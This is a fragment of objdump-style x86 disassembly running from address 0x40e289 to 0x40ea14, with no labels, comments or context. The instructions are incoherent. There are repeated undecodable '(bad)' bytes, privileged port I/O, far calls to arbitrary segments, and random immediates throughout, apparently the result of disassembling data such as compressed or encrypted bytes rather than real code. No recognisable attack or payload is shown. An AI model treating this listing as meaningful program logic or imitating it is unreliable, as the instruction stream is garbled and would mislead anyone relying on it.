  40e289:	push   eax
  40e28a:	fistp  QWORD PTR [ebx-0x6f]
  40e28d:	or     DWORD PTR [edi+eiz*8],0xffffffe7
  40e291:	popf   
  40e292:	out    0xc8,al
  40e294:	in     al,0xf3
  40e296:	jae    0x40e221
  40e298:	aad    0x49
  40e29a:	mov    ds:0x1baa1d12,al
  40e29f:	add    al,bh
  40e2a1:	cmp    ch,cl
  40e2a3:	cmp    dh,BYTE PTR [ebp+ebp*1+0x3c525012]
  40e2aa:	into   
  40e2ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e2ac:	nop
  40e2ad:	jl     0x40e22f
  40e2af:	or     DWORD PTR [ecx-0x276929b2],edx
  40e2b5:	enter  0x60a3,0xab
  40e2b9:	pop    edx
  40e2ba:	(bad)  [esi+0x21]
  40e2bd:	inc    edx
  40e2be:	or     eax,0x9a4209f3
  40e2c3:	or     dh,BYTE PTR [ecx+0x208d0a0a]
  40e2c9:	xchg   edx,eax
  40e2ca:	sub    eax,0xe8ae0c27
  40e2cf:	pop    esi
  40e2d0:	jo     0x40e326
  40e2d2:	ins    BYTE PTR es:[edi],dx
  40e2d3:	jo     0x40e311
  40e2d5:	jp     0x40e280
  40e2d7:	fmul   st,st(3)
  40e2d9:	fst    DWORD PTR [ecx+esi*1-0x55]
  40e2dd:	and    DWORD PTR [ecx-0x7a],eax
  40e2e0:	push   esp
  40e2e1:	cmp    al,0xcd
  40e2e3:	jecxz  0x40e266
  40e2e5:	push   eax
  40e2e6:	adc    DWORD PTR [ebx+0x10],0x47
  40e2ea:	ror    DWORD PTR [edx-0x41243aaf],cl
  40e2f0:	xchg   ebx,eax
  40e2f1:	sbb    eax,edx
  40e2f3:	mov    edi,0xe5096439
  40e2f8:	popf   
  40e2f9:	inc    ebp
  40e2fa:	pop    edi
  40e2fb:	mov    edi,0xd14dfcd1
  40e300:	ss popf 
  40e302:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e304:	dec    ecx
  40e305:	into   
  40e306:	mov    al,ds:0x5c64c7da
  40e30b:	ret    0x4b06
  40e30e:	dec    esp
  40e30f:	inc    esp
  40e310:	adc    ebx,ecx
  40e312:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e313:	leave  
  40e314:	movaps xmm0,XMMWORD PTR fs:[eax]
  40e318:	lds    edx,FWORD PTR [eax+eax*4-0x6eca9808]
  40e31f:	adc    al,0x9c
  40e321:	loopne 0x40e2ae
  40e323:	mov    ds:0xb8835d65,eax
  40e328:	test   BYTE PTR [ebx+ebx*4],bl
  40e32b:	cmp    dh,BYTE PTR [ecx+0x6dff7df6]
  40e331:	push   ss
  40e332:	gs stos BYTE PTR es:[edi],al
  40e334:	(bad)  
  40e335:	test   al,0x81
  40e337:	pusha  
  40e338:	or     esi,edi
  40e33a:	test   esi,ecx
  40e33c:	pushf  
  40e33d:	retf   
  40e33e:	push   es
  40e33f:	aaa    
  40e340:	pop    esi
  40e341:	mov    ds:0x4f90334f,eax
  40e346:	loopne 0x40e2eb
  40e348:	push   cs
  40e349:	call   0xc82f:0xd067d54c
  40e350:	in     al,dx
  40e351:	ja     0x40e34f
  40e353:	test   BYTE PTR [ecx+0x1e],bl
  40e356:	mov    BYTE PTR [ecx+0x4d],al
  40e359:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e35a:	popf   
  40e35b:	mov    al,ds:0x1a48a599
  40e360:	pop    ss
  40e361:	fdiv   QWORD PTR [edi+ebx*8-0x1d]
  40e365:	sub    eax,0xd11386cd
  40e36a:	or     ecx,esp
  40e36c:	fsubp  st(3),st
  40e36e:	mov    BYTE PTR [ebp+0x7e],0xaa
  40e372:	and    eax,eax
  40e374:	call   FWORD PTR [ecx+0x28]
  40e377:	pop    es
  40e378:	dec    ecx
  40e379:	push   eax
  40e37a:	lea    edx,[ebp-0x4c]
  40e37d:	pop    ecx
  40e37e:	inc    ebx
  40e37f:	cmp    cl,BYTE PTR [ecx+eiz*4+0x4727f6b0]
  40e386:	repz scas al,BYTE PTR es:[edi]
  40e388:	sub    eax,0xafd77899
  40e38d:	sahf   
  40e38e:	retf   0xebb
  40e391:	xchg   ebx,eax
  40e392:	retf   
  40e393:	daa    
  40e394:	stc    
  40e395:	jl     0x40e36f
  40e397:	jnp    0x40e3cd
  40e399:	cmc    
  40e39a:	scas   al,BYTE PTR es:[edi]
  40e39b:	or     esi,ebp
  40e39d:	push   ebp
  40e39e:	mov    esp,0x81ecbfa3
  40e3a3:	sti    
  40e3a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e3a5:	in     al,dx
  40e3a6:	cmc    
  40e3a7:	cmp    bl,ch
  40e3a9:	push   ss
  40e3aa:	(bad)  
  40e3ab:	arpl   WORD PTR [ebp+0x448e6f3b],si
  40e3b1:	out    dx,eax
  40e3b2:	shl    DWORD PTR [edx-0x58fd9811],1
  40e3b8:	mov    bl,0xc2
  40e3ba:	(bad)  
  40e3bc:	(bad)  
  40e3bd:	fistp  QWORD PTR [ecx]
  40e3bf:	sti    
  40e3c0:	fsub   QWORD PTR [esi]
  40e3c2:	ficom  WORD PTR [ebx+0x40]
  40e3c5:	aas    
  40e3c6:	push   0xfb631cac
  40e3cb:	sbb    bl,dl
  40e3cd:	jp     0x40e3c8
  40e3cf:	mov    al,0x55
  40e3d1:	retf   
  40e3d2:	call   0xcee0cb41
  40e3d7:	sahf   
  40e3d8:	pop    es
  40e3d9:	data16 mov dh,0xd3
  40e3dc:	and    DWORD PTR [ebp-0x43],0x7a4309dd
  40e3e3:	out    0x19,al
  40e3e5:	or     ebx,DWORD PTR [ecx]
  40e3e7:	cmp    DWORD PTR [eax-0x1],esp
  40e3ea:	xor    al,0xa9
  40e3ec:	in     al,0x16
  40e3ee:	add    cl,BYTE PTR [eax-0x21887f48]
  40e3f4:	shl    DWORD PTR [esi+0x1],1
  40e3f7:	cwde   
  40e3f8:	enter  0x955e,0xc8
  40e3fc:	arpl   WORD PTR [ebx],di
  40e3fe:	xor    esi,ebx
  40e400:	retf   
  40e401:	std    
  40e402:	inc    edi
  40e403:	and    eax,0x308d837b
  40e408:	fwait
  40e409:	and    ch,BYTE PTR [eax+ecx*8+0x3411d7c4]
  40e410:	out    0x28,eax
  40e412:	ds xor ch,bh
  40e415:	and    eax,0x9a3fc9c2
  40e41a:	mov    al,ch
  40e41c:	lds    esp,FWORD PTR [esi-0x21]
  40e41f:	inc    ebx
  40e420:	xchg   esp,eax
  40e421:	xchg   esp,eax
  40e422:	xor    al,0xcd
  40e424:	xor    BYTE PTR [ecx+0x4cd9cf75],dh
  40e42a:	inc    edi
  40e42b:	pusha  
  40e42c:	pop    ds
  40e42d:	push   0x3c4ebbe2
  40e432:	sbb    esi,esi
  40e434:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e435:	xchg   DWORD PTR [esi-0x3269fb4c],esp
  40e43b:	adc    esp,DWORD PTR [edx+eax*4-0x57080ff8]
  40e442:	retf   0xbf66
  40e445:	hlt    
  40e446:	fwait
  40e447:	jecxz  0x40e401
  40e449:	xchg   ecx,eax
  40e44a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e44b:	jb     0x40e4c4
  40e44d:	retf   
  40e44e:	hlt    
  40e44f:	inc    ecx
  40e450:	sbb    BYTE PTR [edx],al
  40e452:	xchg   edi,eax
  40e453:	sbb    dl,dh
  40e455:	in     eax,0x9
  40e457:	test   bl,ch
  40e459:	inc    edx
  40e45a:	js     0x40e3e8
  40e45c:	pop    eax
  40e45d:	and    edi,DWORD PTR [eax-0x4f6a8b4]
  40e463:	test   BYTE PTR [ebp-0x7d],bh
  40e466:	jo     0x40e3f1
  40e468:	sti    
  40e469:	stos   DWORD PTR es:[edi],eax
  40e46a:	sbb    ch,BYTE PTR [esi]
  40e46c:	sti    
  40e46d:	pmaxub mm6,QWORD PTR ds:0xe65f8ca1
  40e474:	arpl   WORD PTR [ebp+0x3c],dx
  40e477:	nop
  40e478:	or     cl,cl
  40e47a:	into   
  40e47b:	ret    0xb18b
  40e47e:	pushf  
  40e47f:	js     0x40e48b
  40e481:	xor    eax,0xaf0ce9d
  40e486:	and    eax,0xe2b0f641
  40e48b:	sti    
  40e48c:	in     eax,dx
  40e48d:	mov    edx,0xd30b277b
  40e492:	std    
  40e493:	mov    es,WORD PTR [eax-0x1513297a]
  40e499:	mov    bh,0x97
  40e49b:	lods   al,BYTE PTR ds:[esi]
  40e49c:	ror    BYTE PTR [esi-0x10107b91],0x4d
  40e4a3:	mov    BYTE PTR [edi],dh
  40e4a5:	jp     0x40e4ee
  40e4a7:	push   esp
  40e4a8:	inc    ecx
  40e4a9:	imul   esp,ebp,0x72a9abf1
  40e4af:	mov    edx,0xb5bd24b
  40e4b4:	ss call 0xfbf855b5
  40e4ba:	sbb    BYTE PTR [ebx+0x76],0x42
  40e4be:	xor    al,0xb
  40e4c0:	push   esi
  40e4c1:	aaa    
  40e4c2:	cmc    
  40e4c3:	cmp    DWORD PTR [esi],edi
  40e4c5:	push   ecx
  40e4c6:	and    BYTE PTR [eax+0x2],bl
  40e4c9:	push   eax
  40e4ca:	xlat   BYTE PTR ds:[ebx]
  40e4cb:	fld    DWORD PTR [edx+0x29]
  40e4ce:	add    DWORD PTR ds:0xaba449b3,esp
  40e4d4:	sti    
  40e4d5:	icebp  
  40e4d6:	enter  0xf6b8,0xdf
  40e4da:	loope  0x40e53f
  40e4dc:	mov    BYTE PTR [ecx+0x34e0aae1],al
  40e4e2:	call   0xa8fd:0x7cb99980
  40e4e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e4ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e4eb:	pop    esi
  40e4ec:	prefetchnta BYTE PTR [ebx+0x41]
  40e4f0:	push   ss
  40e4f1:	jl     0x40e562
  40e4f3:	pop    ecx
  40e4f4:	mov    ecx,0xef22b0f5
  40e4f9:	fs mov ah,0xa0
  40e4fc:	jbe    0x40e4d0
  40e4fe:	sbb    ch,BYTE PTR [edi-0x36]
  40e501:	outs   dx,BYTE PTR ds:[esi]
  40e502:	sti    
  40e503:	loope  0x40e527
  40e505:	dec    esp
  40e506:	push   cs
  40e507:	mov    DWORD PTR [ebx+0x5c77efc6],edi
  40e50d:	mov    BYTE PTR [ebp+0x48],ch
  40e510:	mov    DWORD PTR [eax],ebp
  40e512:	sbb    ch,ah
  40e514:	jbe    0x40e4a2
  40e516:	test   BYTE PTR [eax+0x8555ec9],cl
  40e51c:	repz retf 0x9a26
  40e520:	xor    al,0x6f
  40e523:	pop    esp
  40e524:	inc    edx
  40e525:	mov    bh,0x5c
  40e527:	imul   eax,DWORD PTR [eax],0xfffffff9
  40e52a:	sub    ecx,DWORD PTR [ebp-0x39a44384]
  40e530:	xchg   ebx,eax
  40e531:	mov    eax,ds:0x39c4ff25
  40e536:	jns    0x40e535
  40e538:	adc    BYTE PTR [ebx+0x4a],0xb7
  40e53c:	cmp    al,0xe5
  40e53e:	je     0x40e587
  40e540:	ins    DWORD PTR es:[edi],dx
  40e541:	mov    esp,0x56afb89d
  40e546:	pop    edx
  40e547:	pop    ebx
  40e548:	pop    ebp
  40e549:	xor    bl,dh
  40e54b:	fwait
  40e54c:	push   eax
  40e54d:	adc    ecx,ebx
  40e54f:	sbb    DWORD PTR [eax+ebp*2],esi
  40e552:	enter  0xf84b,0x34
  40e556:	das    
  40e557:	test   eax,0x1e492be0
  40e55c:	ss jnp 0x40e576
  40e55f:	shl    ch,cl
  40e561:	jae    0x40e587
  40e563:	jp     0x40e57a
  40e565:	shl    ecx,0x3e
  40e568:	and    edx,DWORD PTR [ebx-0x4778dfab]
  40e56e:	sub    al,0x59
  40e570:	adc    eax,0xc88d0056
  40e575:	adc    esp,edi
  40e577:	dec    ebx
  40e578:	repnz test eax,0x5a6a1466
  40e57e:	push   ss
  40e57f:	add    DWORD PTR [ebx],0xffffff9c
  40e582:	pop    es
  40e583:	lods   al,BYTE PTR ds:[esi]
  40e584:	inc    ecx
  40e585:	hlt    
  40e586:	push   esp
  40e587:	mov    dl,0xec
  40e589:	out    dx,eax
  40e58a:	xabort 0xc9
  40e58d:	sub    al,0x50
  40e58f:	cmp    ecx,edi
  40e591:	retf   0x4735
  40e594:	fild   DWORD PTR [ebx]
  40e596:	add    eax,0x7f00e5f3
  40e59b:	sahf   
  40e59c:	icebp  
  40e59d:	call   0xb9edceae
  40e5a2:	xor    al,0xdc
  40e5a4:	lods   eax,DWORD PTR ds:[esi]
  40e5a5:	dec    edx
  40e5a6:	jp     0x40e5e9
  40e5a8:	iret   
  40e5a9:	inc    esp
  40e5aa:	mov    esp,0xa8d759b4
  40e5af:	loope  0x40e581
  40e5b1:	out    0xa9,eax
  40e5b3:	lods   eax,DWORD PTR ds:[esi]
  40e5b4:	push   ss
  40e5b5:	mov    ds:0xa7b647a7,eax
  40e5ba:	push   eax
  40e5bb:	and    al,0x94
  40e5bd:	push   es
  40e5be:	int3   
  40e5bf:	jnp    0x40e62a
  40e5c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e5c2:	jo     0x40e555
  40e5c4:	aas    
  40e5c5:	cmp    esi,DWORD PTR [ebx-0x20f34b77]
  40e5cb:	mov    ds:0x50556b25,eax
  40e5d0:	sub    DWORD PTR [edx+0x2278cee7],ebp
  40e5d6:	popf   
  40e5d7:	into   
  40e5d8:	ja     0x40e5ca
  40e5da:	jge    0x40e61c
  40e5dc:	je     0x40e5b6
  40e5de:	pop    esi
  40e5df:	mov    al,ds:0xe5d364f2
  40e5e4:	out    0x9,eax
  40e5e6:	mov    ds:0xcd450658,al
  40e5eb:	mov    edx,0x7ce04dbb
  40e5f0:	adc    dh,cl
  40e5f2:	push   ds
  40e5f3:	cwde   
  40e5f4:	or     eax,DWORD PTR [edx]
  40e5f6:	sbb    eax,0xfb6a92cd
  40e5fb:	sar    ch,1
  40e5fd:	jge    0x40e5f3
  40e5ff:	xor    bl,cl
  40e601:	retf   
  40e602:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e603:	xchg   esi,eax
  40e604:	inc    dl
  40e606:	in     eax,dx
  40e607:	mov    ah,0x79
  40e609:	jne    0x40e66c
  40e60b:	sub    eax,0x302c67c3
  40e610:	ins    DWORD PTR es:[edi],dx
  40e611:	call   0x56edd651
  40e616:	retf   0x1a7e
  40e619:	add    al,0x7a
  40e61b:	mov    cl,0xf8
  40e61d:	pop    esi
  40e61e:	add    bl,bl
  40e620:	pop    esi
  40e621:	mul    BYTE PTR [ecx-0x6bedf502]
  40e627:	jge    0x40e60e
  40e629:	pop    es
  40e62a:	scas   eax,DWORD PTR es:[edi]
  40e62b:	mov    ecx,0x1a8fc7c7
  40e630:	loop   0x40e689
  40e632:	and    BYTE PTR [esi+0x5ea8ebfa],bl
  40e638:	pusha  
  40e639:	push   ebp
  40e63a:	adc    bh,BYTE PTR [eax]
  40e63c:	mov    DWORD PTR [edi-0x376c9f04],0xff3a66f9
  40e646:	iret   
  40e647:	enter  0x865f,0xcd
  40e64b:	jbe    0x40e5e1
  40e64d:	cmp    al,0x6d
  40e64f:	cld    
  40e650:	xchg   edx,eax
  40e651:	shl    esp,1
  40e653:	jg     0x40e64e
  40e655:	mov    eax,ds:0x8396948f
  40e65a:	arpl   WORD PTR [ecx+ebp*1],bx
  40e65d:	imul   BYTE PTR [eax]
  40e65f:	cmp    eax,0xdce9620b
  40e664:	inc    edx
  40e665:	cmp    BYTE PTR [ecx-0x5c00b021],ah
  40e66b:	inc    eax
  40e66c:	adc    al,0x45
  40e66e:	mov    ecx,0xf5560e72
  40e673:	nop
  40e674:	popf   
  40e675:	je     0x40e690
  40e677:	mov    cl,0xfe
  40e679:	mov    dl,0x88
  40e67b:	sahf   
  40e67c:	fdivr  DWORD PTR ds:0x9c9339b5
  40e682:	fiadd  DWORD PTR [ebp-0x76]
  40e685:	xor    bl,BYTE PTR [esi-0x56]
  40e688:	mov    ch,0xa0
  40e68a:	test   DWORD PTR [ebx-0x73b9b91d],edx
  40e690:	cmp    eax,0xdc3d42e6
  40e695:	xchg   ebx,eax
  40e696:	and    BYTE PTR [esi],dl
  40e698:	clc    
  40e699:	mov    ebx,0x6a9a7ec3
  40e69e:	xor    esp,edx
  40e6a0:	jl     0x40e71a
  40e6a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e6a3:	jae    0x40e713
  40e6a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6a6:	add    esi,DWORD PTR ds:0xf8693e58
  40e6ac:	aam    0x9f
  40e6ae:	dec    ebp
  40e6af:	xchg   ecx,eax
  40e6b0:	adc    bh,BYTE PTR [eax-0x2024024c]
  40e6b6:	aad    0xb2
  40e6b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6b9:	mov    WORD PTR [eax+edi*2-0xe70828e],es
  40e6c0:	rcl    esi,0x6e
  40e6c3:	or     eax,0xa0b28fa8
  40e6c8:	cmp    al,0x9
  40e6ca:	xchg   ebx,eax
  40e6cb:	jne    0x40e6de
  40e6cd:	push   0xfffffff8
  40e6cf:	test   DWORD PTR [edi+0x41],edi
  40e6d2:	push   ebx
  40e6d3:	and    ch,ah
  40e6d5:	sahf   
  40e6d6:	pop    esp
  40e6d7:	repz retf 
  40e6d9:	test   ebx,edi
  40e6db:	shr    DWORD PTR [esi+0x77],cl
  40e6de:	dec    eax
  40e6df:	int3   
  40e6e0:	js     0x40e721
  40e6e2:	retf   0x38d0
  40e6e5:	fldenv [edx]
  40e6e7:	xchg   ebx,eax
  40e6e8:	adc    eax,0xeaaaef5d
  40e6ed:	js     0x40e699
  40e6ef:	add    al,0xd9
  40e6f1:	push   ds
  40e6f2:	not    dh
  40e6f4:	inc    eax
  40e6f5:	arpl   WORD PTR [edi+0x53],bp
  40e6f8:	fild   QWORD PTR [ebp-0x6]
  40e6fb:	sbb    edx,edi
  40e6fd:	cs mov dh,0xf
  40e700:	pop    es
  40e701:	sahf   
  40e702:	hlt    
  40e703:	repz push edi
  40e705:	inc    esi
  40e706:	mov    eax,ds:0x392470a6
  40e70b:	push   ebp
  40e70c:	mov    bl,0x52
  40e70e:	pop    ss
  40e70f:	fisttp WORD PTR ds:0xee094a5d
  40e715:	dec    edi
  40e716:	test   eax,0xfd20ab89
  40e71b:	push   esp
  40e71c:	jge    0x40e6b9
  40e71e:	in     eax,dx
  40e71f:	cmp    BYTE PTR [edx-0x33142e0],ch
  40e725:	imul   ebx,DWORD PTR [edi-0x4a],0xb3a6e70
  40e72c:	xchg   ebx,eax
  40e72d:	inc    DWORD PTR [ebp+0x23ee88db]
  40e733:	or     eax,DWORD PTR [eax+0x36]
  40e736:	loop   0x40e6de
  40e738:	stos   DWORD PTR es:[edi],eax
  40e739:	jns    0x40e778
  40e73b:	xchg   edi,eax
  40e73c:	jle    0x40e775
  40e73e:	jmp    0x40e7a1
  40e740:	in     eax,0x93
  40e742:	in     eax,dx
  40e743:	and    edx,esp
  40e745:	pop    ebp
  40e746:	xlat   BYTE PTR ds:[ebx]
  40e747:	rcr    BYTE PTR [esi+0x788986e3],0xf0
  40e74e:	idiv   al
  40e750:	loope  0x40e711
  40e752:	pop    ebx
  40e753:	dec    eax
  40e754:	jle    0x40e7a1
  40e756:	push   ds
  40e757:	fidivr WORD PTR [eax-0x6df2a2ec]
  40e75d:	aam    0xc9
  40e75f:	add    dh,BYTE PTR [ecx-0x2f67adac]
  40e765:	stos   DWORD PTR es:[edi],eax
  40e766:	adc    eax,0x953158b
  40e76b:	push   0xffffffb9
  40e76d:	mov    edi,0x9c75e6ef
  40e772:	inc    esp
  40e773:	cmp    BYTE PTR [ebp+0x46],al
  40e776:	pop    edi
  40e777:	pop    ebp
  40e778:	dec    edi
  40e779:	or     eax,0xfc3a3543
  40e77e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e77f:	loopne 0x40e7fa
  40e781:	pop    ds
  40e782:	idiv   DWORD PTR [eax-0x4d]
  40e785:	retf   
  40e786:	pop    edx
  40e787:	(bad)  
  40e788:	cmp    bl,bh
  40e78a:	scas   eax,DWORD PTR es:[edi]
  40e78b:	ja     0x40e7b1
  40e78d:	or     bl,BYTE PTR [ecx-0x3591a438]
  40e793:	icebp  
  40e794:	out    0x5a,eax
  40e796:	cld    
  40e797:	add    BYTE PTR [ebp-0x2bfced15],ah
  40e79d:	xchg   ebp,eax
  40e79e:	js     0x40e7b2
  40e7a0:	or     DWORD PTR [edx-0x2a93082d],ebp
  40e7a6:	ins    BYTE PTR es:[edi],dx
  40e7a7:	xor    eax,0xb80dff2
  40e7ac:	push   ebp
  40e7ad:	dec    ebp
  40e7ae:	add    edi,0xc959cefc
  40e7b4:	add    DWORD PTR [esi],ebx
  40e7b6:	jl     0x40e804
  40e7b8:	sti    
  40e7b9:	js     0x40e815
  40e7bb:	jmp    0x40e7bc
  40e7bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e7be:	lods   al,BYTE PTR ds:[esi]
  40e7bf:	inc    edx
  40e7c0:	gs shr ah,0x10
  40e7c4:	fld    DWORD PTR [ebp-0x5f405b8a]
  40e7ca:	cmp    al,0xd8
  40e7cc:	push   0xffffffcc
  40e7ce:	fidivr DWORD PTR [ebx+0x1114261e]
  40e7d4:	and    eax,0x90075046
  40e7d9:	push   es
  40e7da:	mov    edi,0xb83ebc75
  40e7df:	popf   
  40e7e0:	cmp    al,BYTE PTR [ebp+edi*2+0x4841bde8]
  40e7e7:	dec    edx
  40e7e8:	adc    BYTE PTR [ecx+0x6c],ah
  40e7eb:	mov    edx,0xacf5aa2a
  40e7f0:	sub    DWORD PTR [ecx],esp
  40e7f2:	lahf   
  40e7f3:	addr16 fstp st(4)
  40e7f6:	in     al,dx
  40e7f7:	jg     0x40e7dc
  40e7f9:	cmp    ecx,ebx
  40e7fb:	xchg   esi,eax
  40e7fc:	shl    BYTE PTR [esi+0x566b3c20],0x88
  40e803:	push   eax
  40e804:	ins    BYTE PTR es:[edi],dx
  40e805:	(bad)  
  40e806:	cli    
  40e807:	inc    edx
  40e808:	xchg   esi,eax
  40e809:	psrad  mm4,mm6
  40e80c:	sub    ebp,esi
  40e80e:	cmp    al,ch
  40e810:	iret   
  40e811:	fldenv [edi-0x6f0a3c5e]
  40e817:	test   eax,0xa092d492
  40e81c:	mov    esi,0x55d88e97
  40e821:	sbb    dh,BYTE PTR [edi-0x7926cb05]
  40e827:	sbb    eax,0xc6c66bd6
  40e82c:	jne    0x40e80f
  40e82e:	call   0xd005:0xc6c96650
  40e835:	and    al,BYTE PTR [edx+0x50045e35]
  40e83b:	nop
  40e83c:	cmovbe ebx,ebp
  40e83f:	lahf   
  40e840:	sub    eax,0xbc3cfd01
  40e845:	cmp    BYTE PTR [ebp-0x29648ed3],0xcc
  40e84c:	cwde   
  40e84d:	cmp    al,0xd6
  40e84f:	mov    ss,WORD PTR [ecx+0x42b684bc]
  40e855:	fistp  WORD PTR [edx-0x17]
  40e858:	and    cl,BYTE PTR [edi+0x74dc9e0c]
  40e85e:	(bad)  
  40e85f:	in     al,0xa8
  40e861:	ret    0xfc63
  40e864:	jge    0x40e887
  40e866:	gs pop edi
  40e868:	pop    esi
  40e869:	sub    esi,DWORD PTR [edi-0x9]
  40e86c:	fisubr DWORD PTR [esi-0x21c4bd5f]
  40e872:	and    ch,BYTE PTR [esi+0x22]
  40e875:	clc    
  40e876:	aam    0x66
  40e878:	leave  
  40e879:	or     BYTE PTR [ecx-0x1e],0x91
  40e87d:	xor    esp,DWORD PTR ds:0xc7b87df1
  40e883:	or     eax,0xd07e3311
  40e888:	cdq    
  40e889:	xor    al,0x74
  40e88b:	jecxz  0x40e82b
  40e88d:	ret    0xebe6
  40e890:	jnp    0x40e8ec
  40e892:	mov    cl,0xff
  40e894:	ss add bl,ch
  40e897:	push   ebp
  40e898:	or     eax,0x3ae6db01
  40e89d:	mov    edx,0xb65e0fb6
  40e8a2:	xchg   ebp,eax
  40e8a3:	push   edi
  40e8a4:	or     eax,0xd9f431db
  40e8a9:	push   edi
  40e8aa:	xor    DWORD PTR [edx+0x15a178a1],0xffffff93
  40e8b1:	(bad)  
  40e8b2:	pop    es
  40e8b3:	inc    edi
  40e8b4:	test   BYTE PTR [edx+0x6c6ac9bb],dl
  40e8ba:	xor    ecx,DWORD PTR [ebp-0x11a045c2]
  40e8c0:	es in  al,0xda
  40e8c3:	enter  0x6132,0x51
  40e8c7:	fs scas eax,DWORD PTR es:[edi]
  40e8c9:	daa    
  40e8ca:	dec    esi
  40e8cb:	jns    0x40e8e3
  40e8cd:	mov    DWORD PTR [esp+ebx*8+0x4165b798],ebp
  40e8d4:	jnp    0x40e8e4
  40e8d6:	and    al,0xa2
  40e8d8:	(bad)  
  40e8d9:	adc    eax,edi
  40e8db:	cmc    
  40e8dc:	stc    
  40e8dd:	dec    edi
  40e8de:	lods   al,BYTE PTR ds:[esi]
  40e8df:	(bad)  
  40e8e0:	dec    ecx
  40e8e1:	xor    cl,al
  40e8e3:	test   al,0xc2
  40e8e5:	sub    DWORD PTR [esi+edx*8],ebp
  40e8e8:	mov    edi,0x56819e02
  40e8ed:	push   ds
  40e8ee:	data16 xor BYTE PTR [ecx],ch
  40e8f1:	test   eax,0x73476476
  40e8f6:	pop    edx
  40e8f7:	test   al,0x9d
  40e8f9:	out    dx,eax
  40e8fa:	lea    edx,[eax]
  40e8fc:	pop    ebp
  40e8fd:	jne    0x40e891
  40e8ff:	inc    ebx
  40e900:	push   ds
  40e901:	jo     0x40e8cb
  40e903:	enter  0xff75,0x46
  40e907:	out    dx,eax
  40e908:	cld    
  40e909:	pop    ds
  40e90a:	punpcklwd mm6,DWORD PTR [eax-0x38]
  40e90e:	popf   
  40e90f:	adc    DWORD PTR [esi-0x13b0bc19],0x76
  40e916:	test   BYTE PTR [esi],ch
  40e918:	adc    eax,0xcf892cea
  40e91d:	mov    al,0xf5
  40e91f:	push   eax
  40e920:	xor    cl,BYTE PTR gs:[esi+0x27]
  40e924:	cs (bad) 
  40e926:	xor    edx,DWORD PTR [esi+eax*4-0x60]
  40e92a:	ret    
  40e92b:	(bad)
  40e92e:	fucomp st(3)
  40e930:	stc    
  40e931:	std    
  40e932:	mov    ebp,0xf55c7251
  40e937:	dec    esp
  40e938:	adc    al,0x61
  40e93a:	add    eax,0xcfbdc9a
  40e93f:	inc    esi
  40e940:	aam    0x9d
  40e942:	(bad)  
  40e943:	enter  0x7296,0xb
  40e947:	sbb    BYTE PTR [edi-0x6e],ch
  40e94a:	jle    0x40e996
  40e94c:	je     0x40e8fa
  40e94e:	inc    esi
  40e94f:	xor    DWORD PTR [edx+0x11],eax
  40e952:	(bad)
  40e955:	mov    ebx,0x6ec5e0f0
  40e95a:	arpl   WORD PTR [esi],dx
  40e95c:	imul   eax,DWORD PTR [ecx+0x5f],0xffffffab
  40e960:	leave  
  40e961:	jg     0x40e995
  40e963:	ins    BYTE PTR es:[edi],dx
  40e964:	sbb    BYTE PTR [ebp-0x7d9d7e79],dl
  40e96a:	(bad)  
  40e96b:	cs cld 
  40e96d:	pop    edx
  40e96e:	cmp    edi,esi
  40e970:	les    eax,FWORD PTR [ebp-0x289160b0]
  40e976:	pushf  
  40e977:	or     esp,edi
  40e979:	xor    DWORD PTR [esp+ecx*8+0x5f],edx
  40e97d:	imul   edx,DWORD PTR [eax-0x47],0xffffffbf
  40e981:	pop    es
  40e982:	cmp    al,0xbe
  40e984:	mov    eax,0x8de81f87
  40e989:	pop    ds
  40e98a:	push   edi
  40e98b:	cli    
  40e98c:	neg    eax
  40e98e:	push   ecx
  40e98f:	leave  
  40e990:	sub    dh,BYTE PTR [edi+ecx*4+0x355c7180]
  40e997:	add    al,0x55
  40e999:	pop    ebx
  40e99a:	not    ebx
  40e99c:	daa    
  40e99d:	out    0x33,eax
  40e99f:	sub    ecx,edx
  40e9a1:	(bad)  gs:[edx-0x7b]
  40e9a5:	pop    esi
  40e9a6:	loopne 0x40e975
  40e9a8:	xchg   DWORD PTR [edi-0x3f],esi
  40e9ab:	jle    0x40e9da
  40e9ad:	int    0xb0
  40e9af:	sbb    bl,al
  40e9b1:	cmp    eax,0x5808b080
  40e9b6:	cli    
  40e9b7:	mov    dl,0x57
  40e9b9:	(bad)  
  40e9ba:	addr16 push edx
  40e9bc:	xor    ch,bl
  40e9be:	xor    cl,BYTE PTR [ebx+0x52]
  40e9c1:	and    DWORD PTR [eax-0x6fc919be],esi
  40e9c7:	loopne 0x40ea47
  40e9c9:	(bad)  
  40e9ca:	call   0xe55863e2
  40e9cf:	jbe    0x40e9b7
  40e9d1:	sub    edx,eax
  40e9d3:	iret   
  40e9d4:	and    ch,BYTE PTR [ebp-0x6b9c7946]
  40e9da:	xchg   esp,eax
  40e9db:	dec    edx
  40e9dc:	(bad)  
  40e9dd:	fcomip st,st(6)
  40e9df:	fsubr  DWORD PTR [edi-0x11e280d4]
  40e9e5:	sub    ebx,DWORD PTR [ebx]
  40e9e7:	lahf   
  40e9e8:	sub    eax,0x69452074
  40e9ed:	inc    ebx
  40e9ee:	fmul   DWORD PTR [ebx+ebp*4+0x38]
  40e9f2:	shr    DWORD PTR [eax-0x75],0x12
  40e9f6:	mov    edi,0x937c491a
  40e9fb:	mov    ds:0x88572f59,eax
  40ea00:	loope  0x40e9cc
  40ea02:	aaa    
  40ea03:	push   ds
  40ea04:	sub    BYTE PTR ds:0x1a81b1ec,ch
  40ea0a:	shr    DWORD PTR [esi+0x3ac393c8],1
  40ea10:	arpl   WORD PTR [eax+0x77],ax
  40ea13:	popa   
  40ea14:	xchg   esi,eax
